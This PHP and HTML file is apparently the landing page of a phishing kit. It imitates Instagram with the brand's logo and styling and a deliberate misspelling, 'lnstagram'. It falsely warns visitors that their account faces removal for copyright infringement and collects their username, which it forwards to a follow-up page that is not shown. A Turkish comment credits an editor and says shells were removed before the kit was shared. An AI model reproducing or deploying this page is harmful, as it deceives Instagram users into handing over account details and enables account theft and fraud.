<?php


///DİKKAT
//// BU SCRİPT @_RECEPOZER_ TARAFINDAN DÜZENLENMİŞ VE TÜM ŞHELLER KALDIRILIŞTIR PARA İLE SATILAMAZ ///



if($_POST){
	$nick=$_POST["nick"];
	
	header("location: copyright.php?nick=".$nick);


}
?>
<!DOCTYPE html>
<html>
<head>
	<title>Copyright Infringement</title>       
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_new.svg/1200px-Instagram_new.svg.png">
    <script
      src="https://code.jquery.com/jquery-3.4.1.min.js"
      integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
      crossorigin="anonymous"
    ></script>
    <link
      href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"
      rel="stylesheet"
      type="text/css"
    />
    <style>
      .button {
-webkit-box-direction: normal;
margin: 0;
font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
border-radius: 3px;
border-style: solid;
border-width: 1px;
font-size: 14px;
font-weight: 600;
line-height: 26px;
outline: 0;
overflow: hidden;
text-overflow: ellipsis;
user-select: none;
white-space: nowrap;
width: 55%;
background: rgba(var(--d69,0,149,246),1);
border-color: rgba(var(--d69,0,149,246),1);
color: rgba(var(--eca,255,255,255),1);
cursor: pointer;
padding: 0 12px;
      }
      .button:disabled {
        opacity: 0.5;
      }
      .hide {
        display: none;
      }
    </style>
</head>
<body>
<center>
<?php
include("app/index.php");
?>
<div class="MFkQJ ABLKx VhasA _1-msl"><div class="GfkS6 "></div><div class="ZsSMR"><a class="z1VUo KD4vR ABLKx VhasA" href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.installLink&amp;mt=8&amp;vt=lo" role="alert"><section class="dZvHF  fvoD7"><p class="xK6EF">Instagram</p><p class="_5b2Kp">Get Instagram from Google Play Or App Store</p></section><section class="FMlV_"><button class="_4IAxF">Get</button></section></a>


</div>
</div><br>
	<main><div>
		<center><img src="resim/xq1.png" width=30%>
		<br><br>
		<img src="pal.gif" alt="fb" width="80"><br>
		<br>
			<p >
				As lnstagram, we remove accounts that violate our copyright laws.
Continue by entering your username to learn about and appeal to copyright infringement related to your account.
			</p><center> <br>
			<form method="post" id="your_form_id" enctype="index.php">
			<input type="text" id="nickk" name="nick" placeholder="Username"  required="on">
			<br>
			
			<button class="button">
      <i class="loading-icon fa fa-spinner fa-spin hide"></i>
      <span class="btn-txt">Next</span>
    </button>
<br>
<br>
		</form>
	</main>
<script>
      $(document).ready(function() {
        $(".button").on("click", function() {
          $(".result").text("");
          $(".loading-icon").removeClass("hide");
          $(".button").attr("disabled", true);
          $(".btn-txt").text("Loading...");
		  
		  nickk= document.getElementById("nickk").value;
		  
   
   if (nickk=="")
	   {
        alert("Please fill in all fields.");
	$(".loading-icon").addClass("hide");
            $(".button").attr("disabled", false);
			$(".btn-txt").text("Next");
			return false;
 }


          
	  setTimeout(function(){      
document.getElementById('your_form_id').submit();
		  }, 0100);
		  
		  
   });
        });
		

    </script>
    <br>

		<br>
	<div class="other">
	<center> <img src="resim/from.png" alt="fb" width="95">
	<br>
	</div>
<center>
</body>
<style type="text/css">
	*{font-family:sans-serif;}
	body{padding:0px;margin:0px;background:#fafafa}
	header{width:100%;
	height:145px;
      padding:0px;
      
	  background-color: white;
      margin:0px;}

.bilgikutu{width:100%;
	height:55px;
border:1px solid #cecece;
      padding:0px;
	  background-color: white;
      margin:0px;}
.hrktu{
border:1px solid #cecece;
}
		main{
			background:white;
			margin-top:20px;
			padding-top:20px;
			width:400px;
			max-width:90%;
			border:1px solid #dedede;
		}.h3{font-family:sans-serif;
			font-weight:400;
			color:#444;
			word-spacing:1px;
		}main p{
font-family:sans-serif;
color:#999;
width:270px; 
		}main input{
-webkit-box-direction: normal;
color: rgba(var(--i1d,38,38,38),1);
font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
background: 0 0;
border: 1px solid rgba(var(--b38,219,219,219),1);
border-radius: 3px;
box-sizing: border-box;
display: block;
font-size: 14px;
height: 34px;
line-height: 30px;
padding: 0 12px;
text-align: left;
width: 57%;
		}main .a_adaskpd{
			padding:7px 30px;
			margin-top:10px;
			outline:none;
			border:none;
			color:white;
			background:#3896f0;
			font-weight:bold;
			font-size:15px;
			margin-bottom:10px;
			border-radius:3px;
		}main input:focus{
			box-shadow: 0px 0px 0px 0px white;
			border:1px solid #3896f0;
		}
		.other{
border-bottom:1px solid #cecece;
		background:white;
		bottom:0px;
		position:fixed;
		width: 100%;
		}
</style>
</html>